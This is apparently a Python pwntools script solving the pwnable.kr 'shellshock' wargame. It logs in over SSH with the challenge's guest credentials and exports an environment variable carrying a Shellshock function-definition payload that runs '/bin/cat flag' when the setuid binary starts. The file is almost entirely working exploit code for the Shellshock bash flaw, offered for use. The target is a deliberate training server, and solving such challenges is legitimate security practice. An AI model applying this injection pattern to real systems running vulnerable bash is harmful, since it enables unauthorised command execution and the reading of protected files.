#!/usr/bin/python
from pwn import *
from time import sleep

def getOut(cmd,str1):
    retStr=">> "+str1.replace('\\n', '\n').replace('\\t', '\t')[2:len(str1)].replace("shellshock@pwnable:~$ '","")[:-1]
    if retStr !=">> " and retStr != ">> shellshock@pwnable:~$" : 
            print(f"$ {str(cmd)[2:len(str(cmd))-1]}")
            print(retStr+'\n')

def getCMD(shellOBJ,cmd):
    #print(type(shellOBJ))
    shellOBJ.sendline(cmd)
    sleep(2) #time for the server to process the command
    getOut(cmd,str(shellOBJ.recv(timeout=60)))

if __name__ == '__main__':
    sshPwnable = ssh(host="pwnable.kr", port=2222, user="shellshock", password="guest")
    bash=sshPwnable.shell("./bash")
    #print(type(bash))
    #getOut(str(bash.recv(timeout=60)))
    getCMD(bash,b'export PATH=/home/shellshock:$PATH')
    getCMD(bash,b'echo $PATH')
    getCMD(bash,b'export x="() { :;}; /bin/cat flag "')
    #getCMD(bash,b'echo $x')
    getCMD(bash,b'./shellshock')
    bash.close()
    sshPwnable.close()
